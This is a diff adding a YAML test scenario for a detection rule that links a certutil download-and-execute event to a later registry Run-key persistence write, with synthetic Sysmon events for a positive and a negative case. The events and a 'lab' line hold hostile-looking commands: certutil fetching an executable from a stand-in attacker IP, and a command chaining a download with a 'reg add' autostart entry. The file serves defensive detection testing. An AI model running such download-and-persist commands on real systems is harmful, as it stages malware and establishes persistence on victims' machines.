@@ -1,0 +1,14 @@
+scenario: SCE_KC_Execution_Then_Persistence
+cases:
+  - name: positive_certutil_download_then_run_key
+    expect_incidents: [kc_execution_then_persistence, persist_suspicious_autostart]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\certutil.exe', OriginalFileName: CertUtil.exe, CommandLine: 'certutil -urlcache -split -f http://203.0.113.50/u.exe C:\Tools\u.exe', ParentImage: 'C:\Windows\System32\cmd.exe'}
+      - at: 300
+        event: {EventID: 13, Channel: Microsoft-Windows-Sysmon/Operational, EventType: SetValue, Image: 'C:\Windows\System32\reg.exe', TargetObject: 'HKU\S-1-5-21-1-2-3-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Upd', Details: 'C:\Users\victim\AppData\Roaming\u.exe'}
+  - name: negative_persistence_without_prior_execution
+    expect_incidents: [persist_suspicious_autostart]
+    events:
+      - event: {EventID: 13, Channel: Microsoft-Windows-Sysmon/Operational, EventType: SetValue, Image: 'C:\Windows\System32\reg.exe', TargetObject: 'HKU\S-1-5-21-1-2-3-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Upd', Details: 'C:\Users\victim\AppData\Roaming\u.exe'}
+lab:
+  - 'certutil -urlcache -split -f https://live.sysinternals.com/whoami.exe C:\Users\Public\w.exe; reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabUpd /d "%APPDATA%\w.exe" /f'
